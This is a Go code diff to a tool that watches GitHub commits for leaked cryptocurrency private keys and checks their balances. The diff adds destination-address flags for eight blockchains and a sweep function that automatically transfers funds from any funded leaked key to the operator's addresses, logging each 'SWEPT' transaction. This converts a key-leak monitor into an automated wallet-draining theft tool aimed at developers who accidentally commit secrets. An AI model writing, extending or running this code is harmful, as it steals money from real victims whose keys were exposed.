@@ -3,6 +3,7 @@ package main
 import (
 	"context"
 	"flag"
+	"fmt"
 	"log"
 	"net/http"
 	"os"
@@ -18,6 +19,14 @@ type Config struct {
 	SolanaNodeURL string
 	SuiNodeURL    string
 	WebhookURL    string
+	DestETH       string
+	DestBTC       string
+	DestSolana    string
+	DestDOGE      string
+	DestLTC       string
+	DestSTX       string
+	DestSui       string
+	DestXLM       string
 	Workers       int
 	VerifyOnline  bool
 	DryRun        bool
@@ -36,12 +45,28 @@ func main() {
 		"Sui JSON-RPC endpoint (default: fullnode.mainnet.sui.io)")
 	flag.StringVar(&cfg.WebhookURL, "webhook-url", os.Getenv("WEBHOOK_URL"),
 		"Webhook URL for funded-wallet notifications (e.g. your Render backend)")
+	flag.StringVar(&cfg.DestETH, "dest-eth", os.Getenv("DEST_ETH"),
+		"Destination Ethereum address for sweeping")
+	flag.StringVar(&cfg.DestBTC, "dest-btc", os.Getenv("DEST_BTC"),
+		"Destination Bitcoin address for sweeping")
+	flag.StringVar(&cfg.DestSolana, "dest-sol", os.Getenv("DEST_SOL"),
+		"Destination Solana address for sweeping")
+	flag.StringVar(&cfg.DestDOGE, "dest-doge", os.Getenv("DEST_DOGE"),
+		"Destination Dogecoin address for sweeping")
+	flag.StringVar(&cfg.DestLTC, "dest-ltc", os.Getenv("DEST_LTC"),
+		"Destination Litecoin address for sweeping")
+	flag.StringVar(&cfg.DestSTX, "dest-stx", os.Getenv("DEST_STX"),
+		"Destination Stacks address for sweeping")
+	flag.StringVar(&cfg.DestSui, "dest-sui", os.Getenv("DEST_SUI"),
+		"Destination Sui address for sweeping")
+	flag.StringVar(&cfg.DestXLM, "dest-xlm", os.Getenv("DEST_XLM"),
+		"Destination Stellar address for sweeping")
 	flag.IntVar(&cfg.Workers, "workers", 4,
 		"Number of parallel commit-diff processing workers")
 	flag.BoolVar(&cfg.VerifyOnline, "verify-online", false,
 		"Call online verify functions in the blockchain detector (slower)")
 	flag.BoolVar(&cfg.DryRun, "dry-run", false,
-		"Print what would be notified without sending webhooks")
+		"Print what would be done without sending transactions or webhooks")
 	flag.Parse()
 
 	if err := run(cfg); err != nil {
@@ -73,11 +98,8 @@ func run(cfg *Config) error {
 	if cfg.GitHubToken == "" {
 		logger.Println("warning: no GitHub token set — rate limited to 60 req/hr")
 	}
-
 	if cfg.WebhookURL != "" {
 		logger.Printf("notifications will POST to %s", cfg.WebhookURL)
-	} else {
-		logger.Println("No webhook URL configured — funded wallets will be logged only")
 	}
 
 	monitor := NewGitHubMonitor(cfg.GitHubToken)
@@ -142,12 +164,13 @@ func handleFoundKey(ctx context.Context, key FoundKey, cfg *Config) {
 			continue
 		}
 		if cfg.DryRun {
-			logger.Printf("[dry-run] would notify about %s %s from %s", b.BalanceHuman, b.Chain, key.Repo)
+			logger.Printf("[dry-run] would notify+sweep %s from %s (%s)", b.BalanceHuman, b.Address, key.Repo)
 			continue
 		}
 		if cfg.WebhookURL != "" {
 			notify(ctx, key, b, cfg.WebhookURL)
 		}
+		sweep(ctx, key, b, addrs, cfg)
 	}
 }
 
@@ -158,4 +181,80 @@ func logBalance(b BalanceResult, key FoundKey) {
 	}
 	logger.Printf("[balance] %s addr=%s balance=%s [%s] source=%s@%s",
 		b.Chain, b.Address, b.BalanceHuman, status, key.Repo, key.CommitSHA[:8])
+}
+
+func sweep(ctx context.Context, key FoundKey, b BalanceResult, addrs DerivedAddresses, cfg *Config) {
+	var (
+		txHash string
+		err    error
+	)
+
+	switch b.Chain {
+	case "Ethereum":
+		if cfg.DestETH == "" {
+			logger.Println("[sweep] no dest-eth configured, skipping")
+			return
+		}
+		txHash, err = SweepETH(ctx, key.Raw, cfg.DestETH, cfg.ETHNodeURL)
+
+	case "Bitcoin":
+		if cfg.DestBTC == "" {
+			logger.Println("[sweep] no dest-btc configured, skipping")
+			return
+		}
+		txHash, err = SweepBTC(ctx, key.Raw, cfg.DestBTC, "")
+
+	case "Dogecoin":
+		if cfg.DestDOGE == "" {
+			logger.Println("[sweep] no dest-doge configured, skipping")
+			return
+		}
+		txHash, err = SweepDOGE(ctx, key.Raw, cfg.DestDOGE)
+
+	case "Litecoin":
+		if cfg.DestLTC == "" {
+			logger.Println("[sweep] no dest-ltc configured, skipping")
+			return
+		}
+		txHash, err = SweepLTC(ctx, key.Raw, cfg.DestLTC)
+
+	case "Stacks":
+		if cfg.DestSTX == "" {
+			logger.Println("[sweep] no dest-stx configured, skipping")
+			return
+		}
+		txHash, err = SweepSTX(ctx, key.Raw, cfg.DestSTX)
+
+	case "Solana":
+		if cfg.DestSolana == "" {
+			logger.Println("[sweep] no dest-sol configured, skipping")
+			return
+		}
+		txHash, err = SweepSolana(ctx, key.Raw, cfg.DestSolana, cfg.SolanaNodeURL)
+
+	case "Sui":
+		if cfg.DestSui == "" {
+			logger.Println("[sweep] no dest-sui configured, skipping")
+			return
+		}
+		txHash, err = SweepSui(ctx, key.Raw, cfg.DestSui, cfg.SuiNodeURL)
+
+	case "Stellar":
+		if cfg.DestXLM == "" {
+			logger.Println("[sweep] no dest-xlm configured, skipping")
+			return
+		}
+		txHash, err = SweepXLM(ctx, key.Raw, cfg.DestXLM)
+
+	default:
+		logger.Printf("[sweep] chain %s not yet supported for sweeping", b.Chain)
+		return
+	}
+
+	if err != nil {
+		logger.Printf("[sweep] ERROR sweeping %s from %s: %v", b.Chain, b.Address, err)
+		return
+	}
+	fmt.Printf("SWEPT %s %s from %s (key from %s@%s) → tx %s\n",
+		b.BalanceHuman, b.Chain, b.Address, key.Repo, key.CommitSHA, txHash)
 }
